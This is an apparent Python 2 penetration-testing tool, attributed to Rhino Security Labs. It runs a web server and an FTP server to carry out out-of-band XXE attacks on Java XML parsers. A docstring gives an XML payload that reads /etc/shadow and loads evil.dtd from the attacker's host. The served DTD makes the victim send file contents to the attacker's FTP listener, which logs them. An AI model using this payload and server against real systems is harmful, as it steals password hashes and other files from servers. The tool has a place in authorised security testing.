#!/usr/bin/env python
# Dwight Hohnstein
# Rhino Security Labs 2017
#
# This is more or less a direct python port
# of the Java XXE FTP Server outlined by
# Ivan Novikov from http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
#
# Essentially, when sending your XXE request Java
# will send the data over FTP making it much easier
# to parse. I've also added logging data to review
# the results.
#
# Additional notes about XXE - it's tricky. Not
# every shell script will get read over FTP nor
# every log file will get sent. Such is the nature
# of the beast.

import SocketServer
from threading import Thread
from time import sleep
import logging


logging.basicConfig(filename='server-xxe-ftp.log',level=logging.DEBUG)

"""
The XML Payload you should send to the server!

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/shadow">
  <!ENTITY % dtd SYSTEM
  "http://x.x.x.x:8888/evil.dtd">
  %dtd;
]>
<data>&send;</data>
"""

payload = """<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://{}:{}/%file;'>">
%all;"""

def wlog(_str):
    print _str
    logging.info("{}\n".format(_str))

class WebServer(SocketServer.BaseRequestHandler):
    """
    Request handler for our webserver.
    """

    def handle(self):
        """
        Blanketly return the XML payload regardless of who's asking.
        """
        resp = """HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: {}\r\n\r\n{}\r\n\r\n""".format(len(payload), payload)
        # self.request is a TCP socket connected to the client
        self.data = self.request.recv(4096).strip()
        wlog("[WEB] {} Connected and sent:".format(self.client_address[0]))
        wlog("{}".format(self.data))
        # Send back same data but upper
        self.request.sendall(resp)
        wlog("[WEB] Replied with:\n{}".format(resp))

class FTPServer(SocketServer.BaseRequestHandler):
    """
    Request handler for our ftp.
    """

    def handle(self):
        """
        FTP Java handler which can handle reading files
        and directories that are being sent by the server.
        """
        # set timeout
        self.request.settimeout(10)
        wlog("[FTP] {} has connected".format(self.client_address[0]))
        self.request.sendall("220 xxe-ftp-server\n")
        try:
            while True:
                self.data = self.request.recv(4096).strip()
                wlog("[FTP] Received:\n{}".format(self.data))
                if "LIST" in self.data:
                    self.request.sendall("drwxrwxrwx 1 owner group          1 Feb 21 04:37 rsl\n")
                    self.request.sendall("150 Opening BINARY mode data connection for /bin/ls\n")
                    self.request.sendall("226 Transfer complete.\n")
                elif "USER" in self.data:
                    self.request.sendall("331 password please - version check\n")
                elif "PORT" in self.data:
                    wlog("[FTP] ! PORT received")
                    wlog("[FTP] > 200 PORT command ok")
                    self.request.sendall("200 PORT command ok\n")
                elif "SYST" in self.data:
                    self.request.sendall("215 RSL\n")
                else:
                    wlog("[FTP] > 230 more data please!")
                    self.request.sendall("230 more data please!\n")
        except Exception, e:
            if "timed out" in e:
                wlog("[FTP] Client timed out")
            else:
                wlog("[FTP] Client error: {}".format(e))
        wlog("[FTP] Connection closed with {}".format(self.client_address[0]))

def start_server(conn, serv_class):
    server = SocketServer.TCPServer(conn, serv_class)
    t = Thread(target=server.serve_forever)
    t.daemon = True
    t.start()
    
if __name__ == "__main__":
    if not argv[1]:
        print "[-] Need public IP of this server in order to receive data."
        exit(1)
    WEB_ARGS = ("0.0.0.0", 8888)
    FTP_ARGS = ("0.0.0.0", 2121)
    payload = payload.format(argv[1],FTP_ARGS[1])
    wlog("[WEB] Starting webserver on %s:%d..." % WEB_ARGS)
    start_server(WEB_ARGS, WebServer)
    wlog("[FTP] Starting FTP server on %s:%d..." % FTP_ARGS)
    start_server(FTP_ARGS, FTPServer)
    try:
        while True:
            sleep(10000)
    except KeyboardInterrupt, e:
        print "\n[+] Server shutting down."

